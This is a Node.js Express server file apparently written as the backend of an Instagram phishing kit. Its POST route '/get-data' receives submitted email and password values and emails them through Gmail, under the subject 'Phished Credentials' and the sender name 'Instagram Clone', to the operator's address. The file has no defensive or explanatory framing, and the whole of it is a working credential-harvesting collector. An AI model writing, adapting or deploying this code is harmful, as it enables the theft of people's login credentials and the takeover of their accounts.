const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();

app.use(bodyParser.json());
app.use(cors());

// Optional GET route for browser check
app.get("/", (req, res) => {
  res.send("Server is running");
});

// POST route for receiving credentials
app.post("/get-data", async (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "yourgmail@gmail.com",       // ✅ Your Gmail address
      pass: "yourapppassword",           // ✅ Your Gmail App Password
    },
  });

  try {
    const info = await transporter.sendMail({
      from: '"Instagram Clone" <yourgmail@gmail.com>',
      to: "yourgmail@gmail.com", // Can be same or different
      subject: "Phished Credentials",
      text: `Email: ${email}\nPassword: ${password}`,
    });

    console.log("Message sent:", info.messageId);
    res.status(200).json({ message: "Data received and emailed!" });
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
});

// Start the server
app.listen(5500, () => {
  console.log("🚀 Server running on http://localhost:5500");
});

